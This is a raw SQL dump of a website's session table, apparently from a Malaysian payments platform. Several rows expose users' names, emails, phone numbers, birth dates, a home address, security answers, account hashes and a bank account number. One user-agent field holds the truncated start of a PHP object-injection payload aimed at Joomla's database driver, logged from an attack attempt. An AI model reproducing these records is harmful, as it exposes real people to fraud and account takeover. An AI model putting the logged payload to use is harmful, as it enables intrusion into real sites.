('3ae976574ae43863e5e10b8972bd4304', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160578, ''),
('3b1c100c6ab37918ef6b44f01d2dee65', '113.210.58.106', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00J Build', 1461233213, 'a:1:{s:12:"me_id_parent";s:88:"ddu3fBRZM5TA9Fb_f-IDmYSqoSJXKnLwYDHZz7RTBDGlAE__euuu4pbkUyOJYXUbvWQYgueewqT_H1bAq9udqg==";}'),
('3b3ef519154a0c2d6229dafe6857e514', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461735146, ''),
('3b8b390bfe71cb41322a49f91f4a8fc4', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461766868, ''),
('3bacf9244bf9d741b0d35518eebc7769', '60.54.87.69', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461732096, ''),
('3baec21e131ca54217249bbf10b80345', '180.76.15.8', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461231482, ''),
('3bb1ce9f87bbde77999da29265af08a6', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461895008, ''),
('3bd1a8cbd3f161ce7d8292b9764f1a7c', '66.249.69.53', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461605192, ''),
('3bd523f0ba185c4f5c786ec468bf0e72', '157.55.39.27', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461100306, ''),
('3c06d74b479a30ba9e8d2fd35dd0ce80', '180.76.15.161', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461492899, ''),
('3c416ebd67b6b91ac04f5477367976ac', '169.54.233.124', 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/201001', 1461221004, ''),
('3c705d65b9eaa49643cae6ba78e8cefa', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767705, ''),
('3c74597b49fad1720d8eda53ed3a179b', '173.252.115.168', 'facebookexternalhit/1.1', 1461429617, ''),
('3cd414c0b37880deb787be5f2bda49f7', '66.249.64.167', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461809069, ''),
('3d30268bf382c21a57c4cb3595e832a2', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0;', 1461188283, ''),
('3d3f955bc08491c2ca23e0d1234acf18', '157.55.39.150', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461464600, ''),
('3d6a14c2db3b4a3a2fc241efdfc11827', '183.171.29.104', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J700F Build/', 1461498012, 'a:1:{s:12:"me_id_parent";s:88:"XdVPc6bZLiUD3H0yyYfw27DkTca9oKrVJa7Tw2se8iPJdT_UZ-sacMJlA2JwBx_TqhtePLoIh1dtZDm2a7lW6w==";}'),
('3d76fe9d564e229b0cfc0c84b0cd9c90', '66.249.69.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461556578, ''),
('3d7acaa3bdc70756e91b4a6650aaadb0', '144.76.8.132', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461892143, ''),
('3dbc3acbd78ce81d3c2a2dc448d05853', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461898653, ''),
('3dc277694eac518512c3f69d312aed9d', '203.106.157.8', 'Mozilla/5.0 (Linux; Android 4.4.2; Lenovo S850 Bui', 1461491587, 'a:1:{s:12:"me_id_parent";s:88:"k9tf9xRi6IVB2S1YWhw8zMSURSgrCLQYMJqcwg774NXoOXuu66EIo5Hrulybd61THXwif1GyHVaiEICBrbSAAw==";}'),
('3dce12a3d87800d27de67adf48473524', '157.55.39.158', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461167166, ''),
('3de60c22c9d74bdd4883a2ae88af1ab1', '115.164.53.74', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461421060, 'a:62:{s:5:"me_id";s:2:"26";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:3:"mzh";s:11:"me_lastname";s:3:"mzh";s:11:"me_username";s:3:"mzh";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:3:"mzh";s:14:"me_unique_link";s:32:"eab54c7fb6a1daabe6b845752b0b5234";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:16:"ijul89@gmail.com";s:16:"me_register_date";s:19:"2016-04-23 22:15:46";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"ba64d4c8f84e926af9e9955542eff18c";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;s:11:"img_deposit";s:0:"";s:11:"arr_deposit";s:0:"";s:12:"me_id_parent";s:88:"JIXv-ztT2-SXXQCiGTD9I5BeVtiUaV2W1L_yxH4Fn2J32jDq15qr1KpEpADzSJ5gYpGcZ1F3BBCPIsG45NW-Fw==";s:7:"de_code";s:16:"k60b4ddH4rbft7XD";s:16:"admin_account_no";s:14:"04042010006119";s:18:"admin_account_name";s:31:"Koperasi DinarPal Melaka Berhad";s:9:"de_amount";d:202.1200000000000045474735088646411895751953125;s:11:"tr_datetime";s:19:"2016-04-23 22:35:34";s:11:"deposit_fee";s:4:"2.00";s:7:"gst_tax";d:0.11999999999999999555910790149937383830547332763671875;s:8:"tr_notes";s:0:"";}'),
('3df7d62990921c2aab636078b6d7c78d', '144.76.93.46', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461787350, ''),
('3e1b438e7b3b9510ee0af6264372eced', '222.85.138.75', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461696870, ''),
('3e1bca13c875c80d3beda81adfa92cdc', '173.252.90.237', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461408484, 'a:1:{s:12:"me_id_parent";s:88:"qzDeBWf62SQg3MUyunyggTSEt_fMedVTdR_3Lv99Kt8FgPsHxWbaR88GBdZJZalNE8AOIs8jZ2SIQxNRW6IPww==";}'),
('3e6f2ff75f5c28f444473f50c7a3ce0e', '180.76.15.140', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461123745, ''),
('3e9c4e5b9967fcfdf71953f2d5f6e166', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160555, ''),
('3eaac4afec81a22c865e74f4579e0829', '66.249.69.227', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461548127, ''),
('3ec6929472360acb680af118bd456039', '180.76.15.27', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461479677, ''),
('3ec9fbaa4e58be808470a0b1ad6f79d4', '180.76.15.138', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461684020, ''),
('3ee8cd9ed2b0553e28eb22b283115849', '180.76.15.6', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461192399, ''),
('3eeaabdca1b8092b12a2b0f9a6bbd9e3', '66.249.66.30', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461267813, ''),
('3f03cbe541cc23996d9d5f06dec9e2c0', '141.8.142.15', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461247725, ''),
('3f1284f6af6b431a9d9c7418f680a80f', '62.210.148.247', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461938222, ''),
('3f26318485bc1660ca8d9b7af33ae0a5', '203.82.90.127', 'Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-P5', 1461419668, ''),
('3f31679c00a8a8e1b7276e2e8dffaaec', '113.210.63.242', 'Mozilla/5.0 (Linux; Android 4.4.4; Lenovo A6000 Bu', 1461410341, 'a:1:{s:12:"me_id_parent";s:88:"oV1Lar47ZdJXAN_xQwJiTqLgsBZcoaUgUV-b5-s4nXDluZyBDL0K2nmoE8xQF93z7bPVqPhXVYsHNWW4ije5rA==";}'),
('3f5102c1e7fd619af8c0a0ed89de65ee', '115.164.87.230', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461661258, ''),
('3f9e9b5c77d8b42025e8ea54e4f9c9ab', '103.1.71.146', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461742274, ''),
('3fa159d80c726f2bc051d5a6ab343832', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461934174, ''),
('3fb8f0e8e8aa53771eac41fbac33408b', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0;', 1461188281, ''),
('4019fff74ae62de4793d0752cb9d64fd', '162.210.196.98', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461921105, ''),
('403073803697d1ee02c3c0c666b76498', '115.164.89.210', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461486809, 'a:1:{s:16:"flash:old:sucess";s:40:"Activation is successful, please log in!";}'),
('40465f0d2cfd3753043615eee6952709', '113.238.39.232', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)', 1461884447, ''),
('4067671b8e39482ab624019e825d5006', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461393724, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('407ccb1a469ff62916244cb034993a64', '173.252.75.115', 'facebookexternalhit/1.1', 1461408698, 'a:1:{s:12:"me_id_parent";s:88:"1aX_kBJT4WVvK_oubeLv0gG9VgWCOhqSe8vPH37iCX8yrirNrLb3sPaptAJJdRUz3i48TGsTp5uBNPf6qQSkDA==";}'),
('40a2f1dcaeb69690a1686de168b271fb', '180.76.15.135', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461602795, ''),
('40b5054405618463b2ee9dbad4f9825c', '115.164.50.10', 'WhatsApp/2.12.15/i', 1461489256, 'a:1:{s:12:"me_id_parent";s:88:"ZtTcIW6YwiN56mc3LDvsMUZb_eCvaWg1aXBfXSvVjn54AXegxCx4FzUBld_66yNkzNE7M4fGnXuEVYGGEZb_Vw==";}'),
('40ca607829d11d2364664ca600947d74', '123.125.71.39', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461894472, ''),
('40cc0f4817e372877970e8e7b83c10ac', '123.125.71.85', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461142852, ''),
('40ec6083a3cf5a4855533c394b6b33e7', '180.76.15.6', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461430052, ''),
('40f85d4b9b3e3bb886742ecfa55f4971', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767725, ''),
('41069c6eb4ac8b305564aaa2ef425e2f', '115.164.210.248', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac ', 1461499464, 'a:50:{s:5:"me_id";s:2:"40";s:8:"me_image";s:37:"56690b07231e2711e2dcf3de1862be8a.jpeg";s:12:"me_firstname";s:18:"Mohammad imaduddin";s:11:"me_lastname";s:8:"Md Parid";s:11:"me_username";s:9:"bangtih82";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:9:"bangtih82";s:14:"me_unique_link";s:32:"4a39d4d40bd3ba6e588af660104fae12";s:11:"me_address1";s:0:"";s:8:"me_city1";s:0:"";s:9:"me_state1";s:0:"";s:12:"me_postcode1";s:0:"";s:11:"me_country1";s:0:"";s:11:"me_address2";s:0:"";s:8:"me_city2";s:0:"";s:9:"me_state2";s:0:"";s:12:"me_postcode2";s:0:"";s:11:"me_country2";s:0:"";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:12:"+60164302100";s:13:"me_birth_date";s:10:"1982-03-28";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:20:"doodey5329@gmail.com";s:16:"me_register_date";s:19:"2016-04-24 17:17:52";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-24T17:20:22+08:00";s:12:"me_magic_num";s:32:"1e3c9532960fe3f4ba4941619f117d3d";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:9:"logged_in";b:1;}'),
('410e2e8f2f245c33f8cf63c06acf6524', '180.76.15.148', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461795377, ''),
('414b7d6aec43f0f1fc4af74cfdfa18d2', '183.171.161.218', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-G531H Build/', 1461499253, ''),
('417854d8919c66d7299bf966f06e1d7b', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461422006, ''),
('419f0bdecb4350a502debc0c73fc0f93', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; America Online ', 1461487072, ''),
('41a86f9daa47f4cfe0dcad25790fd661', '180.76.15.144', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461864567, ''),
('41b65f895e145b22d7ff31a5927ed027', '123.136.112.50', 'Mozilla/5.0 (Linux; Android 5.0; SM-N9005 Build/LR', 1461456707, ''),
('41c18c403333fc273493dadf56114548', '175.143.113.162', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461311934, ''),
('41e475366967a0da2de6f36ce7c18e53', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461394613, ''),
('41f0ee8f781e7c0936fd8e73e46643c7', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894755, ''),
('420387451362032d937986d597da9b17', '89.163.148.58', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461115279, ''),
('4214181b6d984f681b6a063bbf0888dc', '13.92.241.115', 'semanticbot', 1461739131, ''),
('4242c5068a665631056089ce9762bef2', '69.171.228.119', 'facebookexternalhit/1.1', 1461421907, 'a:1:{s:12:"me_id_parent";s:88:"L07DOUAqiGkZ71SG7nXFIYb9BjBuWu-8B6hX8YNL6TBvhc7Ax3Is4IuqPgwBoXu6gvWzgLZUDKTk2S4ntObKCA==";}'),
('424adddcd17a6a276108509f90ee6ce2', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461741102, ''),
('42567fe22737d86d00c7370f4884e5ad', '180.76.15.155', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461284524, '');
INSERT INTO `ci_sessions` (`session_id`, `ip_address`, `user_agent`, `last_activity`, `user_data`) VALUES
('428a067de0a962f5d6a510bdb405e87f', '183.171.18.225', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461463923, 'a:51:{s:5:"me_id";s:2:"35";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:10:"nurazrreen";s:11:"me_lastname";s:10:"nurazrreen";s:11:"me_username";s:10:"nurazrreen";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:10:"nurazrreen";s:14:"me_unique_link";s:32:"5afe6b6e249668f18abe527959bc69ea";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:22:"nurazrreen@hotmail.com";s:16:"me_register_date";s:19:"2016-04-24 10:08:07";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"738d5e06b188a6e88d96f5a9f3108e0c";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;}'),
('42bb35a2b69d9dee8600f2dd36665e5b', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461262396, ''),
('43819f922777c068e1afff2f56d36cc0', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;', 1461699350, ''),
('4384d4d81ff414e12f485f04dddaf494', '40.77.167.84', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461559416, ''),
('439bc0d3f90310f70b85e9839094e689', '91.121.169.194', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461770615, ''),
('43a23c7a1e75c5acfce4e82cf565ad4c', '78.158.11.226', 'Lynx/2.8.5rel.1 libwww-FM/2.15FC SSL-MM/1.4.1c Ope', 1461878834, ''),
('43dc4dd53c3d9d1d26b0ea579d880be2', '103.1.71.112', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-gb; SM-G3', 1461488001, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('43f0f325efca6516526eed7e6960c5b0', '5.248.253.133', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)', 1461159325, ''),
('43f1a03835ffc61f6f855cd6e9f7e507', '180.76.15.135', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461095330, ''),
('43f7fc89106731de13b1fa3cb82f9821', '66.249.64.170', 'DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Goog', 1461784420, ''),
('440e1c4cdc34cf014b3d22407719054d', '180.76.15.150', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461188367, ''),
('445bbb5ebdff08032b8af99ae6691fa6', '180.76.15.139', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461458685, ''),
('446d2800ba4775ba80f2396879888c3f', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461737009, ''),
('449bb9257f141680847916c000bdd4a3', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461186645, ''),
('44a09e92caa73bb5dbd96d0e52a88b53', '180.76.15.159', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461242250, ''),
('44b7b12a3f0b3085cf1a62b8ae108cb6', '198.186.192.44', '0', 1461875888, ''),
('44c4cc3e7c795752a194ffeeaf9d278b', '66.249.69.227', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461549038, ''),
('44d76c87fb189ee0174479a30d4cf74c', '207.46.13.185', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461430673, ''),
('44f13481bb933d329b0c8198f8f7ccf7', '113.210.60.46', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461429756, ''),
('451ca0242b82d957581fc19f8cbee2a8', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.0; Window', 1461188320, ''),
('4523895453010a5c2f6ef1d493946611', '115.134.161.155', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/53', 1461307176, ''),
('4553e0360886a0177391e4518ba7e8f3', '134.249.55.100', 'Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)', 1461188427, ''),
('458bcca38b42683614b076eb494082f0', '180.76.15.148', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461813797, ''),
('45fb03b7dd1f657c9d83807b3bcd5da0', '180.76.15.149', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461888868, ''),
('461abc443eb4eb8c96ecb2c16706ded2', '180.76.15.17', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461770459, ''),
('4635db9b2400c45ffb676d1e9c8e3431', '157.55.39.218', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461216684, ''),
('465b16d34e85062b6d270793e359c37c', '175.143.42.189', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko', 1461551952, 'a:50:{s:5:"me_id";s:2:"36";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:12:"Mohd Kamarul";s:11:"me_lastname";s:12:"Mohd Mustafa";s:11:"me_username";s:4:"alon";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:4:"alon";s:14:"me_unique_link";s:32:"d4b9967b6c3f9cdb6210cb408e82a5be";s:11:"me_address1";s:38:"190 Taman Nakishah, Jalan Datuk Kumbar";s:8:"me_city1";s:10:"Alor Setar";s:9:"me_state1";s:5:"Kedah";s:12:"me_postcode1";s:5:"05450";s:11:"me_country1";s:8:"Malaysia";s:11:"me_address2";s:38:"190 Taman Nakishah, Jalan Datuk Kumbar";s:8:"me_city2";s:10:"Alor Setar";s:9:"me_state2";s:5:"Kedah";s:12:"me_postcode2";s:5:"05450";s:11:"me_country2";s:8:"Malaysia";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0193902805";s:13:"me_birth_date";s:10:"1980-05-28";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:15:"Kamarul Mustafa";s:10:"me_twitter";s:14:"KamarulMustafa";s:12:"me_instagram";s:12:"alonthegreat";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:10:"0193902805";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:22:"alonthegreat@gmail.com";s:16:"me_register_date";s:19:"2016-04-24 14:55:26";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-24T14:56:52+08:00";s:12:"me_magic_num";s:32:"7fee64c2276e0d711cca8555c0d4c4f1";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:9:"logged_in";b:1;}'),
('466666f9377074030aaa21117cdf955e', '45.79.89.188', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461311753, ''),
('46885cfbc024ea7990c0cf17b945a41d', '66.249.66.36', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461303464, ''),
('4693503f741af0328f70f171bb7b3027', '66.249.77.57', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461169653, ''),
('46bbd599aa63dd576374bf973e2a0e5b', '173.252.74.109', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461231329, ''),
('4701dc5e4c811c79b32e101356d00744', '180.76.15.8', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461095413, ''),
('47333d6a854f22727f64b8662bc5a0aa', '180.76.15.10', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461469241, ''),
('475b313399d0616abf34118b84812b78', '173.252.90.240', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461899407, 'a:1:{s:12:"me_id_parent";s:4:"Cz0=";}'),
('47cabdf771c5deda52f89b37ca49f658', '180.76.15.140', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461279626, ''),
('47ef1e0a877dbaaebec3a4024d2d1599', '178.137.90.202', 'Opera/9.00 (Windows NT 4.0; U; en)', 1461733894, ''),
('4834d5973beaea84ba69793f9bbe77fc', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461898657, ''),
('486f8f353c78713bced4055cb172b824', '5.9.89.170', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461935050, ''),
('489f7431e871c146fabbfd2441b19e9a', '180.76.15.155', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461543123, ''),
('48ab0797ca5122b872e6c0324137762a', '157.55.39.201', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461797924, ''),
('48ac20db84d363a299200f9ada1353aa', '180.76.15.135', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461559650, ''),
('49529382ae2358a14b19cb93ff4d0129', '180.76.15.143', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461727334, ''),
('496dcc6b3fa4c8bbda2be9df06cbbf77', '149.154.167.161', 'TelegramBot (like TwitterBot)', 1461911517, 'a:1:{s:12:"me_id_parent";s:8:"AjYMOA==";}'),
('4971f23dbb248b26e4694417cfb8dc4e', '216.163.188.233', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko', 1461692898, ''),
('4989934b8156cb57fd873be4af2f5d15', '66.220.152.7', 'facebookexternalhit/1.1', 1461429620, ''),
('49a07940ae10fb8b4daa2acd3f0360c7', '180.76.15.20', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461784866, ''),
('49a547404e6cfd9bc6eb0e846757974d', '51.255.48.155', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461934946, ''),
('49b74c4485dc1a66f4073cadfee91526', '66.249.69.116', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461684377, ''),
('49b8e9ecb568b3e5f5ac17a2bf8839a8', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461941966, ''),
('49c32f992aa0dce347fce4de35fd266b', '157.55.39.77', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461472184, ''),
('49dfa0ed2bb2105b28014e4241845fd5', '180.76.15.140', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461921552, ''),
('49e54ecc2582a7dcfcbbbf14911754ec', '192.187.114.11', '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O', 1461435635, ''),
('4a08831ba7b3548e748a261505e5ef3c', '66.249.66.55', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461290527, ''),
('4a62f579217752d6d965a3add40d897f', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767691, ''),
('4a6753c66e14e3f54b3500dfe3b8f52a', '66.220.146.145', 'facebookexternalhit/1.1', 1461429616, ''),
('4ad0e23232a36be93d9f4caa5efe4f5f', '180.76.15.158', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461871250, ''),
('4ad46a3635545ca757c16f7f037b7342', '157.55.39.163', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461232632, ''),
('4addadf84173fd0888724c7d0824d134', '180.76.15.17', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461837847, ''),
('4b06726228cfda5dbff779cc9f3209a2', '173.252.90.243', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461249131, 'a:1:{s:12:"me_id_parent";s:88:"vejHSQphqjR4ZHgUUUTTgWg0qf61JCrVFtAAkMdbtK6qDyWZ8g-miuVSFcehaewLyo9tUGaWp78tdL2nyP_WcQ==";}'),
